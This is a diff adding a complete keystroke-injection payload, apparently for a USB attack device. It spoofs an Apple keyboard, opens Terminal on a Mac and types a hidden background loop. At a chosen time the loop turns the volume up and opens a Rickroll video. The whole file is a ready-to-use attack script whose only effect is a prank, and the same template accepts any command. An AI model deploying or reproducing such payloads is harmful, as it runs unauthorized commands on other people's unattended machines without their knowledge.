@@ -1,0 +1,31 @@
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+#Set time to run at. Use following format: 1:23pm would be 1323 and 11:56am would be 1156
+
+time=2332
+
+#Set led to flash red
+LED R 200
+
+#Start attack
+
+Q GUI SPACE
+Q DELAY 200
+Q STRING terminal
+Q DELAY 100
+Q ENTER
+Q DELAY 1000
+Q GUI n
+Q DELAY 1000
+
+#The payload
+
+Q STRING hi=0\; ho=\$\(date \'+%H%M\'\)\; while test \$hi == \'0\'\;  do    if [ \$ho == $time ]\;    then osascript -e \"set Volume 9\" \&\& open \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" \;    hi=1\;    fi\;    ho=\$\(date \'+%H%M\'\)\;  done \& disown
+
+# close up shop
+Q DELAY 200
+Q ENTER
+Q GUI W
+Q ENTER
+
+LED G
